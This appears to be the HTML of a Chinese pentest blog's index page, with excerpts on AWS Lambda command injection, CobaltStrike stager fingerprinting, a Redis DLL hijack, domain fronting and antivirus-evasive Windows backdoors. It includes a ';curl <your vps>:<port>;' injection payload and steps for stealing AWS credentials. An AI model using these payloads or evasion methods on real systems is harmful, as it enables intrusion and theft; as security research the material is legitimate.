@@ -1,0 +1,633 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 2 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>😊#<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		wubba lubba dub dub.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/04/01/aws-lambda-rce.html" >Lambda远程命令执行测试</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-04-01  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
+<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
+cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p>
+<h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul>
+<li>Lambda函数代码路径: <code>/var/task</code></li>
+<li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
+<li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li>
+<li>默认用户: <code>sbx_userxxx</code></li>
+<li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li>
+<li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li>
+</ul>
+<p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p>
+<p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p>
+	
+
+	</div>
+  <a type="button" href="/2021/04/01/aws-lambda-rce.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
+<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
+cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p>
+<h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul>
+<li>Lambda函数代码路径: <code>/var/task</code></li>
+<li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
+<li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li>
+<li>默认用户: <code>sbx_userxxx</code></li>
+<li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li>
+<li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li>
+</ul>
+<p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p>
+<p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p>
+	
+	</div>
+  <a type="button" href="/2021/04/01/aws-lambda-rce.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/01/04/CloudFront-find-cobaltstrike.html" >CobaltStrike的Stager特征隐藏</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-01-04  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p>
+<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
+<h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p>
+<h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p>
+<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p>
+	
+
+	</div>
+  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p>
+<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
+<h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p>
+<h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p>
+<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p>
+	
+	</div>
+  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/09/10/redis-windows-hijack.html" >Redis On Windows -- Dll Hijack</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-09-10  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文测试了Redis在Windows平台下的dll劫持，主要参考文章是先知的秋水师傅: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153">Redis on Windows 出网利用探索</a></p>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100
+Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="可劫持的DLL"><a href="#可劫持的DLL" class="headerlink" title="可劫持的DLL"></a>可劫持的DLL</h3><p>按照文章中使用<code>Process Monitor</code>，在使用<code>redis-cli</code>操作的时候，观察缺失的DLL。在<code>Process Monitor Filter</code>里面设置<code>Image Path</code>的值为<code>redis-server.exe</code>的路径，比如我的是<code>C:\Program Files\Redis\redis-server.exe</code>，<code>Path</code>设置为<code>ends with dll</code>。设置好之后，使用<code>redis-cli</code>连接，执行<code>bgsave</code>命令，然后观察缺失的dll，有如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
+C:\Program Files\Redis\dbghelp.dll
+C:\Windows\System32\edgegdi.dll
+C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>当<code>redis-server.exe</code>启动的时候，有如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dll
+C:\Windows\System32\symsrv.dll
+C:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<p>执行<code>BGREWRITEAOF</code>的时候，有如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
+C:\Program Files\Redis\dbghelp.dll
+C:\Windows\System32\edgegdi.dll
+C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2020/09/10/redis-windows-hijack.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文测试了Redis在Windows平台下的dll劫持，主要参考文章是先知的秋水师傅: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153">Redis on Windows 出网利用探索</a></p>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100
+Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="可劫持的DLL"><a href="#可劫持的DLL" class="headerlink" title="可劫持的DLL"></a>可劫持的DLL</h3><p>按照文章中使用<code>Process Monitor</code>，在使用<code>redis-cli</code>操作的时候，观察缺失的DLL。在<code>Process Monitor Filter</code>里面设置<code>Image Path</code>的值为<code>redis-server.exe</code>的路径，比如我的是<code>C:\Program Files\Redis\redis-server.exe</code>，<code>Path</code>设置为<code>ends with dll</code>。设置好之后，使用<code>redis-cli</code>连接，执行<code>bgsave</code>命令，然后观察缺失的dll，有如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
+C:\Program Files\Redis\dbghelp.dll
+C:\Windows\System32\edgegdi.dll
+C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>当<code>redis-server.exe</code>启动的时候，有如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dll
+C:\Windows\System32\symsrv.dll
+C:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<p>执行<code>BGREWRITEAOF</code>的时候，有如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
+C:\Program Files\Redis\dbghelp.dll
+C:\Windows\System32\edgegdi.dll
+C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2020/09/10/redis-windows-hijack.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/08/28/CloudFront-Https.html" >Domain Fronting隐藏HTTPS</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-08-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p>
+<p>###目标</p>
+<ol>
+<li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li>
+<li>AWS的<code>Cloudfront</code>作为前置域名</li>
+</ol>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.com
+VPS(Centos)
+cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p>
+<pre class="line-numbers language-none"><code class="language-none">yum install httpd
+systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
+&lt;VirtualHost *:80&gt;
+   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
+   ServerName example.com
+
+
+RewriteEngine on
+RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
+RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
+&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p>
+<p>###目标</p>
+<ol>
+<li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li>
+<li>AWS的<code>Cloudfront</code>作为前置域名</li>
+</ol>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.com
+VPS(Centos)
+cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p>
+<pre class="line-numbers language-none"><code class="language-none">yum install httpd
+systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
+&lt;VirtualHost *:80&gt;
+   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
+   ServerName example.com
+
+
+RewriteEngine on
+RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
+RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
+&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/08/28/hide-your-windows-backdoor.html" >Windows后门隐藏</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-08-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
+<ol>
+<li>shellcode的分离免杀</li>
+<li>C2服务器的隐藏</li>
+<li>Windows后门的设置</li>
+</ol>
+<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
+<ol>
+<li>通信: <code>socket</code>,<code>http</code></li>
+<li><code>shellcode</code>的执行方式</li>
+<li><code>shellcode</code>的流量</li>
+<li>远程服务器的隐藏</li>
+</ol>
+<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
+<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
+<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
+<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
+	
+
+	</div>
+  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
+<ol>
+<li>shellcode的分离免杀</li>
+<li>C2服务器的隐藏</li>
+<li>Windows后门的设置</li>
+</ol>
+<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
+<ol>
+<li>通信: <code>socket</code>,<code>http</code></li>
+<li><code>shellcode</code>的执行方式</li>
+<li><code>shellcode</code>的流量</li>
+<li>远程服务器的隐藏</li>
+</ol>
+<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
+<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
+<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
+<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
+	
+	</div>
+  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/3/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+		
+			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+		
+			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+		
+			<li><a href="/categories/Python/">Python<span>5</span></a></li>
+		
+			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+		
+			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
+      </li>
+    
+      <li>
+        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
+      </li>
+    
+      <li>
+        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
+      </li>
+    
+      <li>
+        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
+      </li>
+    
+      <li>
